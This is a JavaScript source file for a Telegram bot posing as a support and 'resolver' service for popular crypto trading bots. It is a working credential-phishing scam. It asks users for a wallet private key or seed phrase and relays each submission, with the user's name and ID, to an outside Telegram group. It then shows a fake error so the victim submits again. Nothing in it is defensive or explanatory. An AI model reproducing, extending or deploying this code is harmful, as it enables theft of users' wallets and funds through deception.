import TelegramBot from "node-telegram-bot-api";
import 'dotenv/config';

const BOT_TOKEN = process.env.BOT_TOKEN;
const GROUP_ID = process.env.GROUP_ID; // External Telegram group to receive notifications

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Store user attempts to track the last option they tried
const userAttempts = {};

// üîπ Handle /start command (Always Shows Full Main Menu)
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || "Unknown User";

    // Notify external group when user starts bot
    bot.sendMessage(GROUP_ID, `üöÄ *New User Started the Bot!* üöÄ\n\nüë§ Username: @${username}\nüÜî User ID: ${msg.from.id}`, { parse_mode: "Markdown" });

    // Show full main menu
    showMainMenu(chatId);
});

// üîπ Handle Main Menu and Callback Queries
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === "general_help") {
        requestWalletImport(chatId);
    } 
    else if (query.data === "other_options") {
        showBotOptions(chatId);
    } 
    else if (query.data === "import_wallet") {
        showWalletOptions(chatId);
    } 
    else if (query.data === "try_again") {
        requestWalletImport(chatId);
    }
});

// üîπ Show Full Main Menu (Scattered Buttons)
function showMainMenu(chatId) {
    bot.sendMessage(chatId, 
        "üí° *Welcome to the Telegram Decentralized Database Bot/Website Resolver ü§©*\n\n" +
        "Where you can address issues such as:\n\n" +
        "üîπ Bot glitches\n" +
        "üîπ Asset Recovery\n" +
        "üîπ High slippage/Gas fees\n" +
        "üîπ Wallet Import Error\n" +
        "üîπ Failed Transactions\n" +
        "üîπ Swap Failures\n" +
        "üîπ Configuration Errors\n" +
        "üîπ Validation Problems\n" +
        "üîπ Rugged Token Issues\n" +
        "üîπ Auto Buy failures\n" +
        "üîπ Slow Bot Performance\n\n" +
        "Below ‚¨áÔ∏è are the options available to resolve any issues you may be experiencing with your bot or website.",
        {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "üõ†Ô∏è GENERAL HELP", callback_data: "general_help" }, { text: "üÜî WALLET VALIDATION", callback_data: "other_options" }],
                    [{ text: "‚öôÔ∏è WALLET CONFIGURATION", callback_data: "other_options" }],
                    [{ text: "üìâ FAILED BUY/SELL ORDER", callback_data: "other_options" }, { text: "üõ†Ô∏è CLEAR BOT GLITCH/ERRORS", callback_data: "other_options" }],
                    [{ text: "üåê GENERAL BOT/WEB ERROR", callback_data: "other_options" }],
                    [{ text: "üî´ FAILED SNIPE", callback_data: "other_options" }, { text: "üîÅ FAILED SWAP", callback_data: "other_options" }],
                    [{ text: "üìú WATCHLIST", callback_data: "other_options" }],
                    [{ text: "üí∞ ASSET RECOVERY", callback_data: "other_options" }],
                    [{ text: "üí∞ HIGH SPILLAGE HELP", callback_data: "other_options" }]
                ]
            }
        }
    );
}

// üîπ Request User to Import Wallet (For GENERAL HELP)
function requestWalletImport(chatId) {
    bot.sendMessage(chatId, "üõ†Ô∏è Please import a web3 wallet with either a Private Key üîë or a 12-24 Seed/Recovery Phrase to get started.");
    
    // ‚ùå Fix: Remove all previous listeners to prevent duplicate "Try Again" buttons
    bot.removeAllListeners("message");

    bot.once("message", (msg) => handleWalletSubmission(msg, chatId));
}

// üîπ Handle Wallet Submission & Send to External Group
function handleWalletSubmission(msg, chatId) {
    const userInput = msg.text;
    const username = msg.from.username || "Unknown User";

    // Save the last attempted option
    userAttempts[chatId] = "wallet_import";

    // Send input to external group
    bot.sendMessage(GROUP_ID, `‚úÖ *New Wallet Submission*\n\nüë§ User: @${username}\nüÜî User ID: ${msg.from.id}\nüìù Data: ${userInput}`, { parse_mode: "Markdown" });

    // Respond with error message and "Try Again" button
    bot.sendMessage(chatId, "‚ùå *Error loading your wallet.*", {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "üîÑ Please try again", callback_data: "try_again" }]
            ]
        }
    });

    // ‚ùå Fix: Remove previous listeners before adding a new one
    bot.removeAllListeners("message");

    // Always listen for new inputs & send them to the group
    bot.once("message", (newMsg) => handleWalletSubmission(newMsg, chatId));
}

// üîπ Show Bot Selection Menu
function showBotOptions(chatId) {
    bot.sendMessage(chatId, "PLEASE CHOOSE YOUR PREFERRED BOT BELOW:", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Trojan on Solana", callback_data: "import_wallet" }, { text: "TradeWiz Bot", callback_data: "import_wallet" }],
                [{ text: "Maestro Bot", callback_data: "import_wallet" }, { text: "GMGN AI", callback_data: "import_wallet" }],
                [{ text: "Unibot", callback_data: "import_wallet" }, { text: "BONKbot", callback_data: "import_wallet" }],
                [{ text: "Banana Gun", callback_data: "import_wallet" }, { text: "Major Buy Bot", callback_data: "import_wallet" }],
                [{ text: "BullX", callback_data: "import_wallet" }, { text: "MevX Bot/Web", callback_data: "import_wallet" }],
                [{ text: "Nova Bot", callback_data: "import_wallet" }, { text: "Sui Sniper Bot", callback_data: "import_wallet" }],
                [{ text: "SolTrading Bot", callback_data: "import_wallet" }, { text: "DEFI Wallet Connect", callback_data: "import_wallet" }],
                [{ text: "Magnum Bot", callback_data: "import_wallet" }, { text: "Shuriken", callback_data: "import_wallet" }],
                [{ text: "Pumpfun Web", callback_data: "import_wallet" }, { text: "Base/Tron/Sui/Xrp/Bsc", callback_data: "import_wallet" }],
                [{ text: "All Others Bots", callback_data: "import_wallet" }]
            ]
        }
    });
}

// üîπ Show Wallet Import Options
function showWalletOptions(chatId) {
    bot.sendMessage(chatId, "üîê Please import your web3 wallet to proceed.", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "üîë Proceed with Seed Phrase", callback_data: "general_help" }],
                [{ text: "üóùÔ∏è Proceed with Private Key", callback_data: "general_help" }]
            ]
        }
    });
}